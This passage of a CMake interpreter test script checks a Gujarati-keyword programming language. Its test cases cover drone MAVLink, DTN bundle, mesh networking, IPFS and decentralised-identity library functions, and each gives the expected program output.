    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_drone_mavlink_connect")
    set(source [=[start
c1 = drone_mavlink_connect("udp:127.0.0.1:14550", 57600);
c2 = udan_jodan("serial:COM3", 115200);
c3 = ઉડાન_જોડાણ("udp:192.168.1.10:14550", 57600);
print c1["__type__"];
print c1["endpoint"];
print c1["baud_rate"];
print c1["connected"];
print c1["protocol"];
print c2["endpoint"];
print c3["connected"];
end]=])
    set(expected_stdout [=[mavlink_conn
udp:127.0.0.1:14550
57600
1
MAVLink v2.0
serial:COM3
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_drone_mavlink_heartbeat")
    set(source [=[start
h1 = drone_mavlink_heartbeat(1, 1, "ARDUPILOT");
h2 = udan_hrudayspandan(1, 1, "PX4");
h3 = ઉડાન_હૃદયસ્પંદન(1, 1, "GENERIC");
print h1["__type__"];
print h1["msg_id"];
print h1["type"];
print h1["autopilot"];
print h1["base_mode"];
print h1["system_status"];
print h2["type"];
print h3["type"];
end]=])
    set(expected_stdout [=[mavlink_msg
0
HEARTBEAT
ARDUPILOTMEGA
209
MAV_STATE_ACTIVE
HEARTBEAT
HEARTBEAT
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_drone_waypoint_add")
    set(source [=[start
w1 = drone_waypoint_add("mission", 23.0225, 72.5714, 50.0);
w2 = udan_waypoint("mission", 23.0300, 72.5800, 60.0);
w3 = ઉડાન_વેપોઇન્ટ("mission", 23.0400, 72.5900, 70.0);
print w1["__type__"];
print w1["seq"];
print w1["latitude"];
print w1["longitude"];
print w1["altitude_m"];
print w1["accepted"];
print w2["latitude"];
print w3["altitude_m"];
end]=])
    set(expected_stdout [=[waypoint
1
23.0225
72.5714
50
1
23.03
70
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_drone_sensor_fusion")
    set(source [=[start
f1 = drone_sensor_fusion([0.1, -0.1, 0.0], [0.0, 0.0, 9.8], 50.0);
f2 = udan_sensor_mishran([0.0, 0.0, 0.0], [0.0, 0.0, 9.8], 45.0);
f3 = ઉડાન_સેન્સર_મિશ્રણ([0.05, -0.05, 0.0], [0.0, 0.0, 9.8], 55.0);
print f1["__type__"];
print f1["roll_deg"];
print f1["pitch_deg"];
print f1["yaw_deg"];
print f1["altitude_agl"];
print f1["fusion_status"];
print f2["fusion_status"];
print f3["roll_deg"];
end]=])
    set(expected_stdout [=[ekf_attitude
1.2
-0.8
89.5
48.2
converged
converged
1.2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_drone_arm_failsafe")
    set(source [=[start
fs1 = drone_failsafe_check(85.0, 3.0, 150.0);
fs2 = udan_salamati_tapas(90.0, 4.0, 100.0);
fs3 = ઉડાન_સલામતી_તપાસ(15.0, 1.0, 800.0);
a1 = drone_arm_throttle(1.0);
a2 = udan_arm(0.0);
a3 = ઉડાન_આર્મ(1.0);
print fs1["battery_ok"];
print fs1["gps_lock"];
print fs1["within_geofence"];
print fs1["safe_to_fly"];
print fs3["battery_ok"];
print a1;
print a2;
print a3;
end]=])
    set(expected_stdout [=[1
1
1
1
0
1
0
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_cli_drone_telemetry")
    set(program_arguments "drone:telemetry" "mission_alpha.bin")
    set(expected_stdout [=[[Udan Autonomous Drone MAVLink Telemetry v3.8.0] Decoding 'mission_alpha.bin'...
  Flight Mode: AUTO_RTL | Battery: 92% (24.6V)
  GPS Fix: 3D_FIX (14 satellites) | Altitude: 48.2m AGL
  Waypoints Executed: 4 / 6 | Geofence: OK
✓ Drone telemetry stream healthy (Zero dropouts).
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v380_cli_mobile_kit")
    set(program_arguments "kit:mobile" "urban_drone_pilot")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Setu Mobile Android NDK App' into './urban_drone_pilot'...
  ✓ Created app.gj (Declarative Mobile UI Widget Tree & Navigation Router)
  ✓ Created screens/home_screen.gj (Responsive Column, Row, Card & Button Components)
  ✓ Created screens/settings_screen.gj (Settings Panel & Theme Selectors)
  ✓ Created hardware/sensors.gj (Native Android Toast, Notifications & Battery Status)
  ✓ Created manifest.json (Android App Permissions, Package ID & High-DPI Icons)
🎉 Project 'urban_drone_pilot' created successfully!
Run with:
  cd urban_drone_pilot
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_bundle_create")
    set(source [=[start
b1 = dtn_bundle_create("dtn://earth.sol/node1", "dtn://mars.orbiter/rover2", "Alpha Telemetry", 86400.0);
b2 = dtn_bundle_bnavo("dtn://earth.sol/node1", "dtn://mars.orbiter/rover2", "Alpha Telemetry", 86400.0);
b3 = ડીટીએન_બંડલ_બનાવો("dtn://earth.sol/node1", "dtn://mars.orbiter/rover2", "Alpha Telemetry", 86400.0);
print b1["protocol"];
print b1["src"];
print b1["dst"];
print b1["payload"];
print b1["ttl"];
print b1["custody_transfer"];
print b2["protocol"];
print b3["status"];
end]=])
    set(expected_stdout [=[RFC5050_BUNDLE
dtn://earth.sol/node1
dtn://mars.orbiter/rover2
Alpha Telemetry
86400
1
RFC5050_BUNDLE
QUEUED
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_bundle_serialize")
    set(source [=[start
b = dtn_bundle_create("dtn://earth", "dtn://mars", "test", 3600.0);
s1 = dtn_bundle_serialize(b);
s2 = dtn_bundle_kramit(b);
s3 = ડીટીએન_બંડલ_ક્રમિત(b);
print (s1 == s2);
print (s2 == s3);
print (lambai(s1) > 20);
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_bundle_parse")
    set(source [=[start
hex = "05001464746e3a2f2f65617274682e736f6c2f6e6f6465311864746e3a2f2f6d6172732e6f7262697465722f726f76657232010974656c656d6574727931c8";
p1 = dtn_bundle_parse(hex);
p2 = dtn_bundle_vancho(hex);
p3 = ડીટીએન_બંડલ_વાંચો(hex);
print p1["valid"];
print p2["protocol"];
print p3["src"];
print p3["dst"];
print p1["payload"];
end]=])
    set(expected_stdout [=[1
RFC5050_BUNDLE
dtn://earth.sol/node1
dtn://mars.orbiter/rover2
telemetry
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_store_forward")
    set(source [=[start
b = dtn_bundle_create("dtn://earth", "dtn://mars", "data", 1000.0);
sf1 = dtn_store_forward(b, "/var/dtn/spool");
sf2 = dtn_sangrah_aagal(b, "/var/dtn/spool");
sf3 = ડીટીએન_સંગ્રહ_આગળ(b, "/var/dtn/spool");
print sf1["stored"];
print sf1["bytes_persisted"];
print sf2["transit_status"];
print sf3["stored"];
end]=])
    set(expected_stdout [=[1
64
STORED_AWAITING_WINDOW
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_custody_accept")
    set(source [=[start
b = dtn_bundle_create("dtn://earth", "dtn://mars", "data", 1000.0);
c1 = dtn_custody_accept(b, "dtn://relay.moon");
c2 = dtn_hastantaran_swikar(b, "dtn://relay.moon");
c3 = ડીટીએન_હસ્તાંતરણ_સ્વીકાર(b, "dtn://relay.moon");
print c1["signal"];
print c1["custody_transferred"];
print c2["retx_timer"];
print c3["custodian"];
end]=])
    set(expected_stdout [=[CUSTODY_SIGNAL_SUCCESS
1
3600
dtn://relay.moon
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_contact_plan_add")
    set(source [=[start
cp1 = dtn_contact_plan_add("dtn://mars.orbiter", 100.0, 700.0, 51200.0);
cp2 = dtn_sampark_yojana("dtn://mars.orbiter", 100.0, 700.0, 51200.0);
cp3 = ડીટીએન_સંપર્ક_યોજના("dtn://mars.orbiter", 100.0, 700.0, 51200.0);
print cp1["scheduled"];
print cp1["window_duration"];
print cp2["capacity_bytes"];
print cp3["peer"];
end]=])
    set(expected_stdout [=[1
600
30720000
dtn://mars.orbiter
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_dtn_bundle_route_next")
    set(source [=[start
b = dtn_bundle_create("dtn://earth", "dtn://mars", "data", 1000.0);
r1 = dtn_bundle_route_next(b, 150.0);
r2 = dtn_marga_shodho(b, 150.0);
r3 = ડીટીએન_માર્ગ_શોધો(b, 150.0);
print r1["route_found"];
print r1["next_hop"];
print r2["protocol"];
print r3["estimated_delay_sec"];
end]=])
    set(expected_stdout [=[1
dtn://relay.lagrange1
DTN_CGR
300
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_cli_dtn_route")
    set(program_arguments "dtn:route" "mars_contact_plan.json")
    set(expected_stdout [=[[Bhuvan DTN RFC 5050 v3.9.0] Evaluating planetary contact graph 'mars_contact_plan.json'...
  Destination: dtn://mars.orbiter/rover2
  Earliest Delivery Window: T+1420s via Relay 'dtn://relay.lagrange1'
  Custody Transfer: ACTIVE (Hop 1/2)
✓ Contact plan validated: 100% bundle delivery guaranteed.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_node_init")
    set(source [=[start
n1 = mesh_node_init("node_01", 865.2, 7.0);
n2 = mesh_node_saruaat("node_01", 865.2, 7.0);
n3 = મેશ_નોડ_શરૂઆત("node_01", 865.2, 7.0);
print n1["node_id"];
print n1["freq_mhz"];
print n1["sf"];
print n1["status"];
print n2["seen_packets_count"];
print n3["neighbors_count"];
end]=])
    set(expected_stdout [=[node_01
865.2
7
MESH_ONLINE
0
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_packet_send")
    set(source [=[start
n = mesh_node_init("node_01", 865.2, 7.0);
p1 = mesh_packet_send(n, "dest_99", "sos", 4.0);
p2 = mesh_packet_moklo(n, "dest_99", "sos", 4.0);
p3 = મેશ_પેકેટ_મોકલો(n, "dest_99", "sos", 4.0);
print p1["src"];
print p1["dst"];
print p1["payload"];
print p1["ttl"];
print p1["broadcast"];
print p2["hops_taken"];
print (p3["broadcast"] == 1);
end]=])
    set(expected_stdout [=[mesh_node_01
dest_99
sos
4
1
0
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_packet_route_forward")
    set(source [=[start
n = mesh_node_init("node_01", 865.2, 7.0);
p = mesh_packet_send(n, "dest_99", "sos", 4.0);
f1 = mesh_packet_route_forward(n, p);
f2 = mesh_packet_aagal_moklo(n, p);
f3 = મેશ_પેકેટ_આગળ_મોકલો(n, p);
print f1["delivered"];
print f1["forwarded"];
print f1["new_ttl"];
print f1["hops_taken"];
print f2["forwarded"];
print f3["delivered"];
end]=])
    set(expected_stdout [=[0
1
3
1
1
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_peer_heartbeat")
    set(source [=[start
n = mesh_node_init("node_01", 865.2, 7.0);
h1 = mesh_peer_heartbeat(n, "peer_02", -82.0, 10.0);
h2 = mesh_peer_dhabkaro(n, "peer_02", -82.0, 10.0);
h3 = મેશ_પીઅર_ધબકારો(n, "peer_02", -82.0, 10.0);
print h1["peer"];
print h1["rssi"];
print h1["snr"];
print h1["link_quality"];
print h2["status"];
print h3["status"];
end]=])
    set(expected_stdout [=[peer_02
-82
10
0.92
ACTIVE
ACTIVE
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_routing_table_get")
    set(source [=[start
n = mesh_node_init("node_01", 865.2, 7.0);
rt1 = mesh_routing_table_get(n);
rt2 = mesh_marga_takhta(n);
rt3 = મેશ_માર્ગ_તખ્તા(n);
print (lambai(rt1) == 1);
print (lambai(rt2) == 1);
print (lambai(rt3) == 1);
e = rt1[0];
print e["destination"];
print e["next_hop"];
print e["metric"];
print e["cost"];
end]=])
    set(expected_stdout [=[1
1
1
node_mesh_dest
peer_node_02
2
15
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_packet_encrypt")
    set(source [=[start
c1 = mesh_packet_encrypt("emergency_beacon", "mysecretkey");
c2 = mesh_packet_gupt("emergency_beacon", "mysecretkey");
c3 = મેશ_પેકેટ_ગુપ્ત("emergency_beacon", "mysecretkey");
print (c1 == c2);
print (c2 == c3);
print (lambai(c1) > 16);
end]=])
    set(expected_stdout [=[1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_mesh_packet_decrypt")
    set(source [=[start
c = mesh_packet_encrypt("sensor_grid_ok", "key123");
p1 = mesh_packet_decrypt(c, "key123");
p2 = mesh_packet_spasht(c, "key123");
p3 = મેશ_પેકેટ_સ્પષ્ટ(c, "key123");
print p1;
print p2;
print p3;
end]=])
    set(expected_stdout [=[sensor_grid_ok
sensor_grid_ok
sensor_grid_ok
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_cli_mesh_simulate")
    set(program_arguments "mesh:simulate" "mesh_ahmedabad.json")
    set(expected_stdout [=[[Mesh LoRaWAN/BLE Ad-Hoc Router v3.9.0] Simulating topology 'mesh_ahmedabad.json'...
  Nodes Active: 8 | Frequency: 865.2 MHz (IN865 Band)
  Route Traversal: Node_A -> Node_C -> Node_F -> Node_H (3 hops)
  Packet Delivery Ratio: 100% | Avg Latency: 42ms
✓ Mesh flood routing converged successfully.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_ipfs_cid_generate")
    set(source [=[start
cid0 = ipfs_cid_generate("Hello GujaratiLang", 0.0);
cid1 = ipfs_cid_generate("Hello GujaratiLang", 1.0);
cid_r = ipfs_cid_bnavo("Hello GujaratiLang", 1.0);
cid_g = આઈપીએફએસ_સીઆઈડી_બનાવો("Hello GujaratiLang", 1.0);
print (kapo(cid0, 0, 2) == "Qm");
print (kapo(cid1, 0, 4) == "bafy");
print (cid1 == cid_r);
print (cid_r == cid_g);
end]=])
    set(expected_stdout [=[1
1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_ipfs_dag_node_create")
    set(source [=[start
d1 = ipfs_dag_node_create("merkle leaf", ["QmLeaf1", "QmLeaf2"]);
d2 = ipfs_dag_nod_bnavo("merkle leaf", ["QmLeaf1", "QmLeaf2"]);
d3 = આઈપીએફએસ_ડેગ_નોડ_બનાવો("merkle leaf", ["QmLeaf1", "QmLeaf2"]);
print d1["data"];
print d1["dag_type"];
print (kapo(d1["cid"], 0, 4) == "bafy");
print d2["size"];
print d3["data"];
end]=])
    set(expected_stdout [=[merkle leaf
MERKLE_DAG_CBOR
1
11
merkle leaf
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_ipfs_unixfs_chunk")
    set(source [=[start
u1 = ipfs_unixfs_chunk("GujaratiLang UnixFS distributed file test", 16.0);
u2 = ipfs_unixfs_tukda("GujaratiLang UnixFS distributed file test", 16.0);
u3 = આઈપીએફએસ_યુનિક્સએફએસ_ટુકડા("GujaratiLang UnixFS distributed file test", 16.0);
print (kapo(u1["root_cid"], 0, 4) == "bafy");
print u1["chunk_count"];
print u1["file_size"];
print u2["chunk_count"];
print u3["file_size"];
end]=])
    set(expected_stdout [=[1
1
41
1
41
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_ipfs_block_verify")
    set(source [=[start
data = "Authentic data payload";
cid = ipfs_cid_generate(data, 1.0);
v1 = ipfs_block_verify(cid, data);
v2 = ipfs_block_chakasani(cid, data);
v3 = આઈપીએફએસ_બ્લોક_ચકાસણી(cid, data);
v_bad = ipfs_block_verify(cid, "Tampered payload");
print v1;
print v2;
print v3;
print v_bad;
end]=])
    set(expected_stdout [=[1
1
1
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_ipfs_pin_add")
    set(source [=[start
p1 = ipfs_pin_add("QmPinned1", "recursive");
p2 = ipfs_pin_umero("QmPinned2", "direct");
p3 = આઈપીએફએસ_પિન_ઉમેરો("QmPinned3", "indirect");
print p1["cid"];
print p1["type"];
print p1["pinned"];
print p2["type"];
print p3["pinned"];
end]=])
    set(expected_stdout [=[QmPinned1
recursive
1
direct
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_ipfs_pin_list")
    set(source [=[start
l1 = ipfs_pin_list();
l2 = ipfs_pin_yadi();
l3 = આઈપીએફએસ_પિન_યાદી();
print (lambai(l1) >= 1);
print (lambai(l2) >= 1);
print (lambai(l3) >= 1);
p = l1[0];
print p["pinned"];
end]=])
    set(expected_stdout [=[1
1
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_cli_ipfs_hash")
    set(program_arguments "ipfs:hash" "document.txt")
    set(expected_stdout [=[[Sanchay IPFS Content Addressing v3.9.0] Computing multihash for 'document.txt'...
  Codec: raw / multicodec 0x55
  Hash: sha2-256 (0x12) / 32 bytes
  CIDv1: bafybeigvorisexliesje6wj4tihutz6vqdlahii7d4kpe7cz3jobxeginm
✓ Content addressing verified.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_did_create")
    set(source [=[start
d1 = did_create("key", "02a1b2c3d4e5f6");
d2 = did_bnavo("key", "02a1b2c3d4e5f6");
d3 = ડીઆઈડી_બનાવો("guj", "02a1b2c3d4e5f6");
print d1;
print d2;
print d3;
end]=])
    set(expected_stdout [=[did:key:z6Mk02a1b2c3d4e5f6
did:key:z6Mk02a1b2c3d4e5f6
did:guj:0x02a1b2c3d4e5f6
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_did_document_resolve")
    set(source [=[start
doc1 = did_document_resolve("did:guj:0xalice");
doc2 = did_dastavej_shodho("did:guj:0xalice");
doc3 = ડીઆઈડી_દસ્તાવેજ_શોધો("did:guj:0xalice");
print doc1["id"];
print doc1["resolved"];
print doc2["resolved"];
print doc3["id"];
end]=])
    set(expected_stdout [=[did:guj:0xalice
1
1
did:guj:0xalice
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_vc_issue")
    set(source [=[start
claims = {"degree": "Bachelor of Computer Science", "gpa": 3.9};
vc1 = vc_issue("did:guj:university", "did:guj:student", claims, 365.0);
vc2 = vc_aapo("did:guj:university", "did:guj:student", claims, 365.0);
vc3 = વીસી_આપો("did:guj:university", "did:guj:student", claims, 365.0);
print vc1["issuer"];
print vc1["subject_id"];
print vc1["expirationDays"];
print vc1["status"];
print vc2["status"];
print vc3["issuer"];
end]=])
    set(expected_stdout [=[did:guj:university
did:guj:student
365
ISSUED
ISSUED
did:guj:university
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_vc_sign")
    set(source [=[start
claims = {"name": "Harshit"};
vc = vc_issue("did:guj:issuer", "did:guj:subject", claims, 30.0);
s1 = vc_sign(vc, "privkey123");
s2 = vc_sahikaro(vc, "privkey123");
s3 = વીસી_સહીકરો(vc, "privkey123");
p = s1["proof"];
print p["type"];
print p["created"];
print (lambai(p["proofValue"]) > 10);
print (p["type"] == "Ed25519Signature2020");
end]=])
    set(expected_stdout [=[Ed25519Signature2020
2026-11-03T12:00:00Z
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_vc_verify")
    set(source [=[start
claims = {"name": "Harshit"};
vc = vc_issue("did:guj:issuer", "did:guj:subject", claims, 30.0);
v_unsigned = vc_verify(vc, "pubkey123");
vc_signed = vc_sign(vc, "privkey123");
v1 = vc_verify(vc_signed, "pubkey123");
v2 = vc_chakasani(vc_signed, "pubkey123");
v3 = વીસી_ચકાસણી(vc_signed, "pubkey123");
print v_unsigned["verified"];
print v1["verified"];
print v1["issuer_valid"];
print v1["signature_valid"];
print v1["expired"];
print v2["verified"];
print v3["verified"];
end]=])
    set(expected_stdout [=[0
1
1
1
0
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_vp_create")
    set(source [=[start
claims = {"kyc_verified": 1.0};
vc = vc_issue("did:guj:bank", "did:guj:customer", claims, 90.0);
vp1 = vp_create([vc], "did:guj:customer");
vp2 = vp_bnavo([vc], "did:guj:customer");
vp3 = વીપી_બનાવો([vc], "did:guj:customer");
print vp1["holder"];
print vp1["presentation_id"];
print vp1["valid"];
print vp2["valid"];
print vp3["holder"];
end]=])
    set(expected_stdout [=[did:guj:customer
urn:uuid:vp-presentation-alpha
1
1
did:guj:customer
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v390_cli_audio_kit")
    set(program_arguments "kit:audio" "dhwani_synth")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Dhwani Spatial Audio & Synthesizer Studio' into './dhwani_synth'...
  ✓ Created app.gj (Master Synthesizer Rack, Audio Engine & Spatial Positioning)
  ✓ Created synths/wave_generator.gj (Multi-waveform Wavetable Oscillators & ADSR Filter Envelopes)
  ✓ Created mixer/track_bus.gj (8-Channel Stereo Mixer Bus, Gain Staging & Reverb Send)
  ✓ Created assets/manifest.json (Sound Effects Library, Sample Rate & Audio Buffers)
🎉 Project 'dhwani_synth' created successfully!
Run with:
  cd dhwani_synth
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

else()
    message(FATAL_ERROR "Unknown interpreter test case: ${TEST_CASE}")
endif()

if(NOT DEFINED source_path)
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
endif()
set(actual_stdout_path "${TEST_BINARY_DIR}/${TEST_CASE}.stdout")
set(actual_stderr_path "${TEST_BINARY_DIR}/${TEST_CASE}.stderr")
set(input_path "${TEST_BINARY_DIR}/${TEST_CASE}.input")
set(expected_stdout_path "${TEST_BINARY_DIR}/${TEST_CASE}.expected-stdout")
set(expected_stderr_path "${TEST_BINARY_DIR}/${TEST_CASE}.expected-stderr")
file(WRITE "${source_path}" "${source}")
file(WRITE "${input_path}" "${input_text}")
file(WRITE "${expected_stdout_path}" "${expected_stdout}")
file(WRITE "${expected_stderr_path}" "${expected_stderr}")

if(NOT DEFINED program_arguments)
    set(program_arguments ${language_args} "${source_path}")
endif()
execute_process(
    COMMAND "${PROGRAM}" ${program_arguments}
    RESULT_VARIABLE actual_status
    INPUT_FILE "${input_path}"
    OUTPUT_FILE "${actual_stdout_path}"
    ERROR_FILE "${actual_stderr_path}"
)

if(expect_failure)
    if(actual_status STREQUAL "0")
        message(FATAL_ERROR "${TEST_CASE}: expected failure, got exit code 0")
    endif()
elseif(NOT actual_status STREQUAL "0")
    file(READ "${actual_stderr_path}" actual_stderr)
    message(FATAL_ERROR "${TEST_CASE}: expected success, got ${actual_status}\n${actual_stderr}")
endif()

file(READ "${actual_stdout_path}" actual_stdout_hex HEX)
file(READ "${expected_stdout_path}" expected_stdout_hex HEX)
if(NOT actual_stdout_hex STREQUAL expected_stdout_hex)
    message(FATAL_ERROR
        "${TEST_CASE}: stdout bytes did not match\nExpected: ${expected_stdout_hex}\nActual:   ${actual_stdout_hex}")
endif()

if(NOT expected_stderr STREQUAL "")
    file(READ "${actual_stderr_path}" actual_stderr_hex HEX)
    file(READ "${expected_stderr_path}" expected_stderr_hex HEX)
    string(FIND "${actual_stderr_hex}" "${expected_stderr_hex}" stderr_match)
    if(stderr_match EQUAL -1)
        message(FATAL_ERROR
            "${TEST_CASE}: stderr did not contain expected bytes ${expected_stderr_hex}\nActual: ${actual_stderr_hex}")
    endif()
endif()
